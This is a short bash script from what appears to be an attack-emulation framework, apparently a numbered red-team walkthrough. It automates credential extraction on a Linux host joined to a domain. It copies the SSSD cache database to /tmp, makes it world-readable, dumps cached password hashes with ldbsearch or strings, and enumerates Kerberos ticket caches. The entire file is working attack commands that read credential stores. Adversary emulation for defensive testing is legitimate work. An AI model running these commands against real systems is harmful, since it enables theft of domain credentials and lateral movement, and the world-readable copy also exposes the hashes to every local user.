#!/bin/bash
# CADRE — WT#045 SSSD Ticket Extraction
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#045 — SSSD Ticket Extraction"
start_attack "045" "SSSD Ticket Extraction"

require_env LINUX01 "LINUX01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Copy the SSSD credential cache DB (contains cached password hashes)"
run_cmd "sudo cp /var/lib/sss/db/cache_$DOMAIN_ROOT.ldb /tmp/sssd_cache.ldb && sudo chmod 644 /tmp/sssd_cache.ldb"

step "Parse cached credentials out of the ldb (cachedPassword hashes)"
# The .ldb is a TDB-backed LDB; ldbsearch/tdbdump reveal cached SHA-512 hashes
run_cmd "command -v ldbsearch >/dev/null && ldbsearch -H /tmp/sssd_cache.ldb '(cachedPassword=*)' cachedPassword name 2>/dev/null || sudo strings /tmp/sssd_cache.ldb | grep -iE 'cachedPassword|krbPrincipalName' | head"

step "Locate live Kerberos ccaches (SSSD uses KCM/KEYRING, not just /tmp)"
run_cmd "klist 2>/dev/null; echo '---'; sudo ls -la /tmp/krb5cc* 2>/dev/null; sudo sssctl user-checks $ATTACK_USER 2>/dev/null | grep -i cache || true"

result $? "SSSD Ticket Extraction completed"
